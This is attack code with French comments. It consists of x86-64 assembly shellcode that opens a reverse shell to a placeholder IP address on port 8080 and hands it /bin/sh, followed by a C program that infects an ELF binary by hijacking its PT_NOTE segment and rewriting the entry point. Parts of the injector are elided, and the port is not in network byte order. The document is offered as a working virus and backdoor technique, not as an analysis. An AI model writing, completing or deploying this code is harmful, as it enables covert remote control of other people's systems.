section .text

global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 41   ; sys_socket
    mov rdi, 2    ; AF_INET
    mov rsi, 1    ; SOCK_STREAM
    mov rdx, 0    ; protocol (0 for default)
    syscall

    ; On stocke le descripteur de socket dans r12 pour une utilisation ultérieure
    mov r12, rax

    ; Préparation de la structure sockaddr_in (sur la pile)
    sub rsp, 16    ; Allouer de l'espace pour sockaddr_in
    mov word [rsp], 2  ; AF_INET (2 octets)
    mov word [rsp+2], 8080  ; Port (en ordre réseau)
    ; Adresse IP de destination (remplacer par l'adresse IP réelle)
    mov dword [rsp+4], 0x01020304 
    mov rdi, rsp    ; Pointeur vers sockaddr_in

    ; connect(socket_fd, &sockaddr_in, sizeof(sockaddr_in))
    mov rax, 42    ; sys_connect
    mov rsi, rdi   ; Pointeur vers sockaddr_in
    mov rdx, 16    ; sizeof(sockaddr_in)
    syscall

    ; dup2(socket_fd, 0) - Rediriger l'entrée standard
    mov rax, 33   ; sys_dup2
    mov rdi, r12  ; Descripteur de socket
    mov rsi, 0    ; stdin (0)
    syscall

    ; dup2(socket_fd, 1) - Rediriger la sortie standard
    mov rsi, 1    ; stdout (1)
    syscall

    ; dup2(socket_fd, 2) - Rediriger la sortie d'erreur
    mov rsi, 2    ; stderr (2)
    syscall


; execve("/bin/sh", ["/bin/sh", NULL], NULL)
push 0x68732f6e69622f ; "/bin/sh"
mov rdi, rsp         ; Pointeur vers l'argument
xor rsi, rsi         ; Deuxième argument NULL (pas besoin de push)
xor rdx, rdx         ; Environnement NULL
mov rax, 59          ; sys_execve
syscall


Code d'injection (C) :

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

// ... (shellcode en octets)

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Utilisation : %s <fichier_cible>\n", argv[0]);
        return 1;
    }

    char *target_file = argv[1];

    int fd = open(target_file, O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    struct stat st;
    if (fstat(fd, &st) == -1) {
        perror("fstat");
        close(fd);
        return 1;
    }

    void *mapped_file = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mapped_file == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mapped_file;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(mapped_file + ehdr->e_phoff);

    // Trouver la section PT_NOTE
    Elf64_Phdr *note_phdr = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_NOTE) {
            note_phdr = &phdr[i];
            break;
        }
    }

    if (!note_phdr) {
        fprintf(stderr, "Aucune section PT_NOTE trouvée dans le fichier cible.\n");
        munmap(mapped_file, st.st_size);
        close(fd);
        return 1;
    }

    // ... (code pour injecter le shellcode dans une nouvelle note PT_NOTE)
    // ... (ajuster les champs de l'en-tête ELF)

    // Modifier le point d'entrée
    ehdr->e_entry = note_phdr->p_vaddr; // Adresse virtuelle de la section PT_NOTE modifiée

    // Sauvegarder les modifications
    if (msync(mapped_file, st.st_size, MS_SYNC) == -1) {
        perror("msync");
    }

    munmap(mapped_file, st.st_size);
    close(fd);

    return 0;
}


